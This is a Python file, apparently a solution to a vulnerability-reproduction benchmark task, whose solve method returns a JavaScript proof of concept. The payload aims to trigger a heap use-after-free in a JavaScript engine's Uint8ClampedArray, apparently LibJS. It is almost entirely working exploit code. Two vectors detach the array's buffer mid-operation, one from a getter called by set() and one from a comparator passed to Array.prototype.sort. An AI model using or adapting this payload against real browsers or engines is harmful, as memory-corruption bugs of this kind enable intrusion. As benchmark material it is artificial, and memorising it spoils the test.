import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in Uint8ClampedArray.
        
        The vulnerability exists because Uint8ClampedArray was implemented as a separate class
        without proper TypedArray inheritance, leading to missing checks for detached ArrayBuffers
        in methods like set() or when interacting with generic Array methods.
        """
        
        # JavaScript payload to trigger the UAF
        # We attempt multiple vectors:
        # 1. Uint8ClampedArray.prototype.set with a malicious source object that detaches the buffer
        # 2. Array.prototype.sort called on Uint8ClampedArray with a comparator that detaches the buffer
        
        js_payload = r"""
function detach(buf) {
    try {
        // SerenityOS / LibJS test environment function
        detachArrayBuffer(buf);
    } catch (e) {
        try {
            // Standard Web API way (if supported)
            structuredClone(buf, { transfer: [buf] });
        } catch (e2) {
             // Fallback: MessagePort (if in a browser-like env)
             try {
                 const { port1 } = new MessageChannel();
                 port1.postMessage(null, [buf]);
             } catch(e3) {}
        }
    }
}

// Vector 1: Trigger UAF via set()
try {
    const uaf_target = new Uint8ClampedArray(1024);
    const evil_source = {
        length: 10,
        get 0() {
            // This getter is called by uaf_target.set()
            // We detach the buffer, freeing the underlying storage
            detach(uaf_target.buffer);
            return 0x41;
        }
    };
    
    // Fill some properties to ensure loop continues if implementation checks
    for (let i = 1; i < 10; i++) {
        evil_source[i] = 0x41;
    }

    // uaf_target.set() will iterate over evil_source.
    // At index 0, it calls the getter, which frees uaf_target's buffer.
    // If set() cached the buffer pointer, it writes to freed memory.
    uaf_target.set(evil_source);
} catch (e) {}

// Vector 2: Trigger UAF via Array.prototype.sort
try {
    const uaf_target2 = new Uint8ClampedArray(1024);
    for (let i = 0; i < 1024; i++) uaf_target2[i] = i % 255;

    // Array.prototype.sort is generic.
    // The implementation might cache the buffer pointer of the 'this' object.
    Array.prototype.sort.call(uaf_target2, (a, b) => {
        detach(uaf_target2.buffer);
        return a - b;
    });
} catch (e) {}
"""
        return js_payload.encode('utf-8')
